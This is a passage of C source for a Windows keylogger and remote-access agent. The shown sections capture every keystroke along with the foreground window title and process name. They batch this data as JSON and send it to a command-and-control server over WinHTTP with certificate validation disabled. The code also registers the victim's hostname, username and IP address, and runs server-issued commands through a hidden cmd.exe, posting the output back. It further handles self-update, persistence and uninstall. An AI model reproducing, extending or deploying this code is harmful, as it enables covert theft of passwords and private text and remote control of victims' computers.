    json_extract_int(buf, "check_interval_seconds", &g_exfil_interval_sec);
    json_extract_int(buf, "heartbeat_interval_seconds", &g_heartbeat_interval_sec);
    json_extract_int(buf, "config_poll_interval_seconds", &g_config_poll_interval_sec);
    json_extract_bool(buf, "encrypt_payload", &g_encrypt_payload);

    /* agent_id */
    char saved_id[AGENT_ID_LEN];
    if (json_extract_string(buf, "agent_id", saved_id, AGENT_ID_LEN)) {
        if (strcmp(saved_id, "auto") != 0) {
            strncpy(g_agent_id, saved_id, AGENT_ID_LEN - 1);
            g_agent_registered = 1;
        }
    }

    /* blacklist array */
    const char *arr = json_array_next(buf, "blacklist_windows", g_blacklist[0], MAX_BLACKLIST_STRLEN);
    if (arr && *arr) {
        g_blacklist_count = 0;
        char item[MAX_BLACKLIST_STRLEN];
        const char *p = arr;
        while (g_blacklist_count < MAX_BLACKLIST &&
               (p = json_array_get_next(p, item, MAX_BLACKLIST_STRLEN)) != NULL) {
            /* json_array_get_next advances p past the item; item was filled on entry */
            if (item[0]) {
                strncpy(g_blacklist[g_blacklist_count], item, MAX_BLACKLIST_STRLEN - 1);
                g_blacklist_count++;
            }
            if (!p || *p == ']') break;
        }
    }

    /* parse URL into host + path + scheme */
    if (g_c2_url[0]) {
        const char *url = g_c2_url;
        if (strncmp(url, "https://", 8) == 0) {
            g_use_https = 1;
            g_c2_port = (g_c2_port != 0) ? g_c2_port : 443;
            url += 8;
        } else if (strncmp(url, "http://", 7) == 0) {
            g_use_https = 0;
            g_c2_port = (g_c2_port != 0) ? g_c2_port : 80;
            url += 7;
        }

        const char *slash = strchr(url, '/');
        if (slash) {
            int host_len = (int)(slash - url);
            if (host_len >= MAX_HOST_LEN) host_len = MAX_HOST_LEN - 1;
            memcpy(g_c2_host, url, host_len);
            g_c2_host[host_len] = '\0';
        } else {
            strncpy(g_c2_host, url, MAX_HOST_LEN - 1);
        }
    }

    HeapFree(GetProcessHeap(), 0, buf);

    if (!g_c2_url[0]) {
        log_write("config: no c2_url set — agent will retry on next poll");
    }

    return 1;
}

/* Apply the compiled-in default C2 URL if no config was loaded. */
static void config_apply_default_url(void) {
    if (g_c2_url[0]) return;  /* already set from config file */

#ifdef DEFAULT_C2_URL
    strncpy(g_c2_url, DEFAULT_C2_URL, MAX_URL_LEN - 1);
    g_c2_url[MAX_URL_LEN - 1] = '\0';

    const char *url = g_c2_url;
    if (strncmp(url, "https://", 8) == 0) {
        g_use_https = 1;
        g_c2_port = (g_c2_port != 0) ? g_c2_port : 443;
        url += 8;
    } else if (strncmp(url, "http://", 7) == 0) {
        g_use_https = 0;
        g_c2_port = (g_c2_port != 0) ? g_c2_port : 80;
        url += 7;
    }

    const char *slash = strchr(url, '/');
    if (slash) {
        int host_len = (int)(slash - url);
        if (host_len >= MAX_HOST_LEN) host_len = MAX_HOST_LEN - 1;
        memcpy(g_c2_host, url, host_len);
        g_c2_host[host_len] = '\0';
    } else {
        strncpy(g_c2_host, url, MAX_HOST_LEN - 1);
    }

    log_write("config: using compiled-in default C2 URL");
#endif
}

/* update agent_config.json with the assigned agent_id */
static int config_save_agent_id(const char *filepath) {
    /* read existing config */
    HANDLE hf = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    char *buf = NULL;
    DWORD size = 0;
    if (hf != INVALID_HANDLE_VALUE) {
        size = GetFileSize(hf, NULL);
        if (size > 0 && size < MAX_CONFIG_FILE) {
            buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 1);
            if (buf) {
                DWORD read;
                ReadFile(hf, buf, size, &read, NULL);
                buf[read] = '\0';
            }
        }
        CloseHandle(hf);
    }

    /* replace or add agent_id */
    char new_json[MAX_CONFIG_FILE];
    if (buf && strstr(buf, "\"agent_id\"")) {
        /* find and replace the value */
        const char *key_pos = strstr(buf, "\"agent_id\"");
        const char *val_start = NULL;
        const char *p = key_pos + 10;
        while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
        if (*p == ':') {
            p++;
            while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
            if (*p == '"') val_start = p;
        }
        if (val_start) {
            const char *val_end = strchr(val_start + 1, '"');
            if (val_end) {
                int prefix_len = (int)(val_start - buf) + 1; /* include opening quote */
                int suffix_start = (int)(val_end - buf);
                snprintf(new_json, MAX_CONFIG_FILE, "%.*s%s%s",
                         prefix_len, buf, g_agent_id, buf + suffix_start);
            } else {
                strncpy(new_json, buf, MAX_CONFIG_FILE - 1);
            }
        } else {
            strncpy(new_json, buf, MAX_CONFIG_FILE - 1);
        }
    } else if (buf) {
        /* json has no agent_id field — insert one after the opening brace */
        const char *brace = strchr(buf, '{');
        if (brace) {
            int prefix_len = (int)(brace - buf) + 1;
            snprintf(new_json, MAX_CONFIG_FILE, "%.*s\n  \"agent_id\": \"%s\",%s",
                     prefix_len, buf, g_agent_id, brace + 1);
        } else {
            snprintf(new_json, MAX_CONFIG_FILE,
                     "{\n  \"agent_id\": \"%s\"\n}", g_agent_id);
        }
    } else {
        snprintf(new_json, MAX_CONFIG_FILE,
                 "{\n  \"agent_id\": \"%s\"\n}", g_agent_id);
    }

    if (buf) HeapFree(GetProcessHeap(), 0, buf);

    hf = CreateFileA(filepath, GENERIC_WRITE, 0, NULL,
                     CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD written;
    WriteFile(hf, new_json, strlen(new_json), &written, NULL);
    CloseHandle(hf);
    return 1;
}

/* ============================================================================
 * SECTION 6: WINDOW CONTEXT CAPTURE
 * ============================================================================ */

static void capture_window_context(char *title, int title_size,
                                   char *process, int proc_size,
                                   DWORD *pid) {
    HWND hwnd = pGetForegroundWindow();
    if (!hwnd) {
        if (title) title[0] = '\0';
        if (process) process[0] = '\0';
        if (pid) *pid = 0;
        return;
    }

    /* window title */
    if (title) {
        pGetWindowTextA(hwnd, title, title_size);
        title[title_size - 1] = '\0';
    }

    /* process ID from window's thread */
    DWORD proc_id = 0;
    pGetWindowThreadProcessId(hwnd, &proc_id);
    if (pid) *pid = proc_id;

    /* process name from PID */
    if (process && proc_id) {
        HANDLE hProc = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, proc_id);
        if (hProc) {
            char mod_name[MAX_PROCESS_NAME];
            DWORD mod_len = pGetModuleBaseNameA(hProc, NULL, mod_name, sizeof(mod_name));
            if (mod_len > 0) {
                strncpy(process, mod_name, proc_size - 1);
                process[proc_size - 1] = '\0';
            } else {
                process[0] = '\0';
            }
            CloseHandle(hProc);
        } else {
            process[0] = '\0';
        }
    }
}

/* check if window title is blacklisted */
static int is_blacklisted(const char *window_title) {
    for (int i = 0; i < g_blacklist_count; i++) {
        if (stristr(window_title, g_blacklist[i])) {
            return 1;
        }
    }
    return 0;
}

/* check if window title is blacklisted by server-supplied list */
static int is_blacklisted_server(const char *window_title) {
    /* server blacklist is merged via config poll — already in g_blacklist */
    return is_blacklisted(window_title);
}

/* ============================================================================
 * SECTION 7: VK CODE TO CHARACTER
 * ============================================================================ */

static const char* vk_to_name(DWORD vk) {
    switch (vk) {
        case VK_RETURN:   return "[Enter]";
        case VK_TAB:      return "[Tab]";
        case VK_BACK:     return "[Backspace]";
        case VK_DELETE:   return "[Delete]";
        case VK_ESCAPE:   return "[Esc]";
        case VK_SPACE:    return " ";
        case VK_LEFT:     return "[Left]";
        case VK_RIGHT:    return "[Right]";
        case VK_UP:       return "[Up]";
        case VK_DOWN:     return "[Down]";
        case VK_HOME:     return "[Home]";
        case VK_END:      return "[End]";
        case VK_PRIOR:    return "[PgUp]";
        case VK_NEXT:     return "[PgDn]";
        case VK_INSERT:   return "[Ins]";
        case VK_CAPITAL:  return "[CapsLock]";
        case VK_NUMLOCK:  return "[NumLock]";
        case VK_SCROLL:   return "[ScrollLock]";
        case VK_SNAPSHOT: return "[PrtSc]";
        case VK_PAUSE:    return "[Pause]";
        case VK_LWIN:     return "[LWin]";
        case VK_RWIN:     return "[RWin]";
        case VK_APPS:     return "[Menu]";
        case VK_F1:  return "[F1]";  case VK_F2:  return "[F2]";
        case VK_F3:  return "[F3]";  case VK_F4:  return "[F4]";
        case VK_F5:  return "[F5]";  case VK_F6:  return "[F6]";
        case VK_F7:  return "[F7]";  case VK_F8:  return "[F8]";
        case VK_F9:  return "[F9]";  case VK_F10: return "[F10]";
        case VK_F11: return "[F11]"; case VK_F12: return "[F12]";
        default: return NULL;
    }
}

static void vk_to_utf8(DWORD vk_code, DWORD flags, char *out, int out_size) {
    const char *name = vk_to_name(vk_code);
    if (name) {
        strncpy(out, name, out_size - 1);
        out[out_size - 1] = '\0';
        return;
    }

    /* try ToUnicode for printable characters */
    BYTE key_state[256] = {0};
    /* check shift states */
    if (pGetKeyState(VK_SHIFT)   & 0x8000) key_state[VK_SHIFT]   = 0x80;
    if (pGetKeyState(VK_CONTROL) & 0x8000) key_state[VK_CONTROL] = 0x80;
    if (pGetKeyState(VK_MENU)    & 0x8000) key_state[VK_MENU]    = 0x80;
    if (pGetKeyState(VK_CAPITAL) & 0x0001) key_state[VK_CAPITAL] = 0x01;

    /* flag 0x01 = extended key; bit 16-23 = scan code */
    UINT scan_code = (flags & 0x01) ? 0xE0 : 0;
    scan_code |= ((flags >> 16) & 0xFF);

    WCHAR wchar_buf[4] = {0};
    int result = pToUnicode(vk_code, scan_code, key_state, wchar_buf, 4, 0);

    if (result > 0) {
        /* got a character — convert to UTF-8 */
        int len = WideCharToMultiByte(CP_UTF8, 0, wchar_buf, result,
                                      out, out_size - 1, NULL, NULL);
        if (len > 0) {
            out[len] = '\0';
            return;
        }
    }

    /* fallback: use VK code hex */
    snprintf(out, out_size, "[VK_%lu]", vk_code);
}

/* ============================================================================
 * SECTION 8: KEYSTROKE BUFFER
 * ============================================================================ */

static void buffer_init(void) {
    InitializeCriticalSection(&g_buffer_cs);
}

static void buffer_push(DWORD vk_code, DWORD flags,
                         const char *window_title,
                         const char *process_name,
                         DWORD process_id) {
    EnterCriticalSection(&g_buffer_cs);

    if (g_buffer_count >= BUFFER_SIZE) {
        /* buffer full — drop oldest (move head forward) */
        g_buffer_head = (g_buffer_head + 1) % BUFFER_SIZE;
        g_buffer_count--;
    }

    int idx = (g_buffer_head + g_buffer_count) % BUFFER_SIZE;
    KeyEvent *evt = &g_keystroke_buffer[idx];

    GetSystemTimeAsFileTime(&evt->timestamp);
    evt->vk_code = vk_code;
    evt->flags = flags;
    strncpy(evt->window_title, window_title ? window_title : "", MAX_WINDOW_TITLE - 1);
    evt->window_title[MAX_WINDOW_TITLE - 1] = '\0';
    strncpy(evt->process_name, process_name ? process_name : "", MAX_PROCESS_NAME - 1);
    evt->process_name[MAX_PROCESS_NAME - 1] = '\0';
    evt->process_id = process_id;

    /* translate to character */
    char key_char[MAX_KEY_CHAR];
    vk_to_utf8(vk_code, flags, key_char, sizeof(key_char));

    /* store character (we only need the first UTF-8 char for JSON) */
    evt->character = 0;
    if (key_char[0] && key_char[0] != '[') {
        /* printable single character */
        evt->character = (WCHAR)(unsigned char)key_char[0];
    }

    g_buffer_count++;
    InterlockedIncrement(&g_keys_since_heartbeat);

    LeaveCriticalSection(&g_buffer_cs);
}

static int buffer_flush(KeyEvent *out, int max_count) {
    EnterCriticalSection(&g_buffer_cs);
    int count = (int)g_buffer_count;
    if (count > max_count) count = max_count;
    int idx = g_buffer_head;

    for (int i = 0; i < count; i++) {
        out[i] = g_keystroke_buffer[idx];
        idx = (idx + 1) % BUFFER_SIZE;
    }

    g_buffer_head = (g_buffer_head + count) % BUFFER_SIZE;
    g_buffer_count -= count;

    LeaveCriticalSection(&g_buffer_cs);
    return count;
}

/* ============================================================================
 * SECTION 9: HTTP EXFILTRATION (WinHTTP)
 * ============================================================================ */

/*
 * Build a JSON batch payload from keystrokes.
 * Returns 1 if payload was built, 0 if no keystrokes to send.
 */
static int json_build_keystroke_batch(char *body, int body_size,
                                       KeyEvent *events, int event_count) {
    int pos = snprintf(body, body_size,
                       "{\"agent_id\":\"%s\",\"events\":[", g_agent_id);
    if (pos >= body_size) return 0;

    for (int i = 0; i < event_count; i++) {
        KeyEvent *evt = &events[i];

        /* format FILETIME as ISO 8601 */
        SYSTEMTIME st;
        FileTimeToSystemTime(&evt->timestamp, &st);
        char timestamp[32];
        snprintf(timestamp, sizeof(timestamp),
                 "%04d-%02d-%02dT%02d:%02d:%02d.%03dZ",
                 st.wYear, st.wMonth, st.wDay,
                 st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

        /* get key character as UTF-8 */
        char key_char[16];
        vk_to_utf8(evt->vk_code, evt->flags, key_char, sizeof(key_char));

        /* escape special chars in window title for JSON */
        char escaped_title[MAX_WINDOW_TITLE * 2];
        int ei = 0;
        for (int c = 0; evt->window_title[c] && ei < (int)sizeof(escaped_title) - 2; c++) {
            char ch = evt->window_title[c];
            if (ch == '"')  { escaped_title[ei++] = '\\'; escaped_title[ei++] = '"'; }
            else if (ch == '\\') { escaped_title[ei++] = '\\'; escaped_title[ei++] = '\\'; }
            else if (ch == '\n') { escaped_title[ei++] = '\\'; escaped_title[ei++] = 'n'; }
            else if (ch == '\r') { escaped_title[ei++] = '\\'; escaped_title[ei++] = 'r'; }
            else if (ch == '\t') { escaped_title[ei++] = '\\'; escaped_title[ei++] = 't'; }
            else { escaped_title[ei++] = ch; }
        }
        escaped_title[ei] = '\0';

        int n = snprintf(body + pos, body_size - pos,
                          "%s{\"timestamp_utc\":\"%s\",\"window_title\":\"%s\",\"process_name\":\"%s\",\"key_char\":\"%s\",\"vk_code\":%lu,\"flags\":%lu}",
                          (i > 0) ? "," : "",
                          timestamp,
                          escaped_title,
                          evt->process_name,
                          key_char,
                          evt->vk_code,
                          (unsigned long)evt->flags);
        if (n < 0 || pos + n >= body_size) break;
        pos += n;
    }

    int n = snprintf(body + pos, body_size - pos, "]}");
    if (n < 0 || pos + n >= body_size) return 0;
    pos += n;
    return 1;
}

static int http_post(const char *path, const char *body, char *response, int resp_size) {
    if (!g_c2_host[0]) return -1;

    WCHAR whost[MAX_HOST_LEN];
    WCHAR wpath[MAX_PATH_LEN];
    MultiByteToWideChar(CP_UTF8, 0, g_c2_host, -1, whost, MAX_HOST_LEN);
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, MAX_PATH_LEN);

    HINTERNET hSession = pWinHttpOpen(
        L"Ghostnet-Agent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return -1;

    HINTERNET hConnect = pWinHttpConnect(hSession, whost,
                                        (INTERNET_PORT)g_c2_port, 0);
    if (!hConnect) { pWinHttpCloseHandle(hSession); return -1; }

    DWORD flags = g_use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = pWinHttpOpenRequest(
        hConnect, L"POST", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        return -1;
    }

    /* allow self-signed certs in testing */
    if (g_use_https) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &sec_flags, sizeof(sec_flags));
    }

    /* set headers */
    WCHAR *wheaders = L"Content-Type: application/json\r\n";
    BOOL ok = pWinHttpSendRequest(
        hRequest, wheaders, (DWORD)-1,
        (LPVOID)body, (DWORD)strlen(body), (DWORD)strlen(body), 0);

    if (ok) ok = pWinHttpReceiveResponse(hRequest, NULL);

    if (ok && response && resp_size > 0) {
        DWORD avail, read;
        int total = 0;
        while (pWinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
            DWORD to_read = avail;
            if (total + (int)to_read >= resp_size) to_read = resp_size - total - 1;
            if (pWinHttpReadData(hRequest, response + total, to_read, &read)) {
                total += read;
                response[total] = '\0';
            } else {
                break;
            }
        }
    }

    pWinHttpCloseHandle(hRequest);
    pWinHttpCloseHandle(hConnect);
    pWinHttpCloseHandle(hSession);
    return (ok && response) ? (int)strlen(response) : (ok ? 0 : -1);
}

static int http_get(const char *path, char *response, int resp_size) {
    if (!g_c2_host[0]) return -1;

    WCHAR whost[MAX_HOST_LEN];
    WCHAR wpath[MAX_PATH_LEN];
    MultiByteToWideChar(CP_UTF8, 0, g_c2_host, -1, whost, MAX_HOST_LEN);
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, MAX_PATH_LEN);

    HINTERNET hSession = pWinHttpOpen(
        L"Ghostnet-Agent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return -1;

    HINTERNET hConnect = pWinHttpConnect(hSession, whost,
                                        (INTERNET_PORT)g_c2_port, 0);
    if (!hConnect) { pWinHttpCloseHandle(hSession); return -1; }

    DWORD flags = g_use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = pWinHttpOpenRequest(
        hConnect, L"GET", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        return -1;
    }

    if (g_use_https) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &sec_flags, sizeof(sec_flags));
    }

    BOOL ok = pWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  NULL, 0, 0, 0);
    if (ok) ok = pWinHttpReceiveResponse(hRequest, NULL);

    if (ok && response && resp_size > 0) {
        DWORD avail, read;
        int total = 0;
        response[0] = '\0';
        while (pWinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
            DWORD to_read = avail;
            if (total + (int)to_read >= resp_size) to_read = resp_size - total - 1;
            if (pWinHttpReadData(hRequest, response + total, to_read, &read)) {
                total += read;
                response[total] = '\0';
            } else {
                break;
            }
        }
    }

    pWinHttpCloseHandle(hRequest);
    pWinHttpCloseHandle(hConnect);
    pWinHttpCloseHandle(hSession);
    return (ok && response) ? (int)strlen(response) : (ok ? 0 : -1);
}

/* ============================================================================
 * SECTION 10: C2 OPERATIONS
 * ============================================================================ */

static void c2_register(void) {
    if (g_agent_registered) {
        log_write("c2: already registered — skipping");
        return;
    }

    char hostname[256] = {0};
    char username[256] = {0};
    DWORD sz = sizeof(hostname);
    GetComputerNameA(hostname, &sz);
    sz = sizeof(username);
    GetUserNameA(username, &sz);

    /* get OS version info */
    char os_ver[128];
    OSVERSIONINFOA ovi = {0};
    ovi.dwOSVersionInfoSize = sizeof(ovi);
    char arch[8]; strcpy(arch, "x86");
#ifdef _WIN64
    strcpy(arch, "x64");
#endif
    /*
     * We avoid GetVersionExA (deprecated/manifest-gated).
     * Use RtlGetVersion via ntdll or just report a static string.
     * For our purposes, a simple string is sufficient.
     */
    snprintf(os_ver, sizeof(os_ver), "Windows %s", arch);

    /* get local IP */
    char local_ip[64]; strcpy(local_ip, "0.0.0.0");
    char host_buf[NI_MAXHOST];
    if (p_gethostname(host_buf, sizeof(host_buf)) == 0) {
        struct hostent *he = p_gethostbyname(host_buf);
        if (he && he->h_addrtype == AF_INET) {
            struct in_addr addr;
            memcpy(&addr, he->h_addr_list[0], sizeof(addr));
            strncpy(local_ip, p_inet_ntoa(addr), sizeof(local_ip) - 1);
        }
    }

    char body[2048];
    snprintf(body, sizeof(body),
             "{\"hostname\":\"%s\",\"username\":\"%s\",\"os_version\":\"%s\",\"ip_address\":\"%s\",\"architecture\":\"%s\"}",
             hostname, username, os_ver, local_ip, arch);

    char response[4096] = {0};
    int ret = http_post("/api/agents/register", body, response, sizeof(response));

    if (ret > 0) {
        /* extract agent_id from response JSON */
        if (json_extract_string(response, "agent_id", g_agent_id, AGENT_ID_LEN)) {
            g_agent_registered = 1;

            /* save the agent_id back to config */
            char config_path[MAX_PATH];
            GetModuleFileNameA(NULL, config_path, MAX_PATH);
            char *slash = strrchr(config_path, '\\');
            if (slash) {
                *(slash + 1) = '\0';
                strcat(config_path, "agent_config.json");
                config_save_agent_id(config_path);
            }

            /* also sync the updated config to the persistence directory */
            {
                char persist_dir[MAX_PATH], persist_cfg[MAX_PATH];
                char dummy1[MAX_PATH], dummy2[MAX_PATH];
                persistence_paths(dummy1, sizeof(dummy1),
                                  persist_dir, sizeof(persist_dir),
                                  dummy2, sizeof(dummy2),
                                  persist_cfg, sizeof(persist_cfg));
                if (persist_cfg[0] && strcmp(persist_cfg, config_path) != 0) {
                    CopyFileA(config_path, persist_cfg, FALSE);
                }
            }

            log_write("c2: registered successfully");
        }

        /* update intervals from server */
        int val;
        if (json_extract_int(response, "exfil_interval_seconds", &val))
            g_exfil_interval_sec = val;
        if (json_extract_int(response, "heartbeat_interval_seconds", &val))
            g_heartbeat_interval_sec = val;

        log_write("c2: config received from server");
    } else {
        log_write("c2: registration failed — will retry");
    }
}

static void c2_exfil(void) {
    KeyEvent *batch_buffer = (KeyEvent*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE * sizeof(KeyEvent));
    if (!batch_buffer) return;

    int count = buffer_flush(batch_buffer, 500);   /* max 500 per batch */

    if (count == 0) { HeapFree(GetProcessHeap(), 0, batch_buffer); return; }

    /* build JSON body */
    char *body = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_JSON_BODY);
    if (!body) { HeapFree(GetProcessHeap(), 0, batch_buffer); return; }

    if (!json_build_keystroke_batch(body, MAX_JSON_BODY, batch_buffer, count)) {
        /* JSON too large — drop events rather than re-queue
         * (re-queuing outside the CS races with concurrent flushes) */
        HeapFree(GetProcessHeap(), 0, batch_buffer);
        HeapFree(GetProcessHeap(), 0, body);
        log_write("c2: exfil — batch dropped (json overflow)");
        return;
    }

    int ret = http_post("/api/keystrokes", body, NULL, 0);
    HeapFree(GetProcessHeap(), 0, batch_buffer);
    HeapFree(GetProcessHeap(), 0, body);

    if (ret < 0) {
        /* network failure — events are lost rather than risking
         * buffer corruption via racy re-queue */
        log_write("c2: exfil failed — events dropped");
    }
}

static void c2_heartbeat(void) {
    LONG keys = InterlockedExchange(&g_keys_since_heartbeat, 0);
    DWORD uptime = (GetTickCount() - g_startup_ticks) / 1000;

    char body[1024];
    snprintf(body, sizeof(body),
             "{\"agent_id\":\"%s\",\"version\":\"%s\",\"keystrokes_since_last\":%ld,\"uptime_seconds\":%lu,\"status\":\"active\"}",
             g_agent_id, AGENT_VERSION, keys, uptime);

    char response[2048] = {0};
    int ret = http_post("/api/agents/heartbeat", body, response, sizeof(response));

    if (ret > 0) {
        /* check for remote actions */
        char action[32] = {0};
        if (json_extract_string(response, "action", action, sizeof(action))) {
            if (stricmp_local(action, "uninstall") == 0) {
                persistence_uninstall();
                log_write("c2: uninstall — persistence removed, exiting");
                pPostQuitMessage(0);
            } else if (stricmp_local(action, "update_config") == 0) {
                /* config will be polled on next cycle */
                log_write("c2: update_config command received");
            } else if (stricmp_local(action, "sleep") == 0) {
                /* TODO: suspend hook temporarily */
                log_write("c2: sleep command received");
            } else if (stricmp_local(action, "exec") == 0) {
                char command_id[64] = {0};
                char command_cmd[MAX_COMMAND_LEN] = {0};
                if (json_extract_string(response, "command_id", command_id, sizeof(command_id)) &&
                    json_extract_string(response, "command_cmd", command_cmd, sizeof(command_cmd))) {

                    log_write("exec: command received, spawning thread");

                    /* Allocate heap memory for thread parameters */
                    char **args = (char**)HeapAlloc(GetProcessHeap(), 0, 2 * sizeof(char*));
                    if (args) {
                        args[0] = (char*)HeapAlloc(GetProcessHeap(), 0, 64);
                        args[1] = (char*)HeapAlloc(GetProcessHeap(), 0, MAX_COMMAND_LEN);
                        if (args[0] && args[1]) {
                            strncpy(args[0], command_id, 63);
                            args[0][63] = '\0';
                            strncpy(args[1], command_cmd, MAX_COMMAND_LEN - 1);
                            args[1][MAX_COMMAND_LEN - 1] = '\0';

                            HANDLE hThread = CreateThread(NULL, 0,
                                c2_exec_command_thread, args, 0, NULL);
                            if (hThread) {
                                CloseHandle(hThread);  /* detach -- fire and forget */
                            } else {
                                log_write("exec: failed to create thread");
                                HeapFree(GetProcessHeap(), 0, args[0]);
                                HeapFree(GetProcessHeap(), 0, args[1]);
                                HeapFree(GetProcessHeap(), 0, args);
                            }
                        } else {
                            if (args[0]) HeapFree(GetProcessHeap(), 0, args[0]);
                            if (args[1]) HeapFree(GetProcessHeap(), 0, args[1]);
                            HeapFree(GetProcessHeap(), 0, args);
                        }
                    }
                } else {
                    log_write("exec: command_id or command_cmd missing");
                }
            }
        }

        /* check if server wants us to update */
        char update_url[MAX_URL_LEN] = {0};
        if (json_extract_string(response, "update_url", update_url, sizeof(update_url))) {
            char update_sha256[65] = {0};
            if (!json_extract_string(response, "update_sha256", update_sha256, sizeof(update_sha256))) {
                log_write("c2: update_url present but update_sha256 missing or invalid");
            }
            c2_update(update_url, update_sha256);
            /* c2_update calls PostQuitMessage — we will not return here */
            return;
        }

        /* check if server has new config */
        int changed = 0;
        if (json_extract_bool(response, "config_changed", &changed) && changed) {
            c2_config_poll();
        }
    } else {
        log_write("c2: heartbeat failed");
    }
}

/* ============================================================================
 * SECTION 10b: REMOTE COMMAND EXECUTION
 *
 * Triggered by the C2 during heartbeat when "action":"exec" is queued.
 * The server includes command_id and command_cmd in the heartbeat response.
 * We execute cmd.exe /c <command> on a background thread, capture output,
 * and POST the result back to the C2.
 * ============================================================================ */

/* JSON-escape a string (reused pattern from keystroke exfil) */
static void json_escape(const char *in, char *out, int out_size) {
    int oi = 0;
    for (int i = 0; in[i] && oi < out_size - 4; i++) {
        char ch = in[i];
        switch (ch) {
            case '"':  out[oi++] = '\\'; out[oi++] = '"';  break;
            case '\\': out[oi++] = '\\'; out[oi++] = '\\'; break;
            case '\n': out[oi++] = '\\'; out[oi++] = 'n';  break;
            case '\r': out[oi++] = '\\'; out[oi++] = 'r';  break;
            case '\t': out[oi++] = '\\'; out[oi++] = 't';  break;
            default:
                if (ch >= 0x20) out[oi++] = ch;
                break;
        }
    }
    out[oi] = '\0';
}

static int c2_exec_command(const char *command_id, const char *command) {
    /* Build cmd.exe /c <command> */
    char cmdline[MAX_COMMAND_LEN + 16];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", command);

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hStdoutRd, hStdoutWr;

    if (!pCreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
        log_write("exec: CreatePipe failed");
        return -1;
    }
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;   /* combine stderr into stdout */
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    BOOL created = pCreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!created) {
        CloseHandle(hStdoutRd);
        log_write("exec: CreateProcess failed");
        return -1;
    }

    /* Read output in a loop until pipe breaks */
    char output[MAX_OUTPUT_SIZE] = {0};
    DWORD total = 0, read = 0;
    while (ReadFile(hStdoutRd, output + total, MAX_OUTPUT_SIZE - total - 1, &read, NULL) && read > 0) {
        total += read;
        if (total >= MAX_OUTPUT_SIZE - 1) {
            output[MAX_OUTPUT_SIZE - 1] = '\0';
            break;
        }
    }
    output[total] = '\0';
    CloseHandle(hStdoutRd);

    /* Wait for process with timeout */
    DWORD wait_result = WaitForSingleObject(pi.hProcess, CMD_TIMEOUT_MS);
    DWORD exit_code = 1;
    if (wait_result == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        log_write("exec: command timed out");
    } else {
        GetExitCodeProcess(pi.hProcess, &exit_code);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* JSON-escape the output */
    char escaped[MAX_OUTPUT_SIZE * 2];
    json_escape(output, escaped, sizeof(escaped));

    /* Build result JSON */
    char result_body[MAX_OUTPUT_SIZE * 2 + 256];
    snprintf(result_body, sizeof(result_body),
             "{\"action_id\":\"%s\",\"exit_code\":%lu,\"stdout\":\"%s\",\"stderr\":\"\"}",
             command_id, (unsigned long)exit_code, escaped);

    char result_path[512];
    snprintf(result_path, sizeof(result_path),
             "/api/agents/%s/command_result", g_agent_id);

    int ret = http_post(result_path, result_body, NULL, 0);
    log_write(ret < 0 ? "exec: failed to report result" : "exec: result reported");
    return (exit_code == 0) ? 0 : 1;
}

static DWORD WINAPI c2_exec_command_thread(LPVOID param) {
    char **args = (char**)param;
    char *command_id = args[0];
    char *command_cmd = args[1];

    log_write("exec: starting on background thread");
    c2_exec_command(command_id, command_cmd);

    HeapFree(GetProcessHeap(), 0, command_id);
    HeapFree(GetProcessHeap(), 0, command_cmd);
    HeapFree(GetProcessHeap(), 0, args);
    return 0;
}

/* ============================================================================
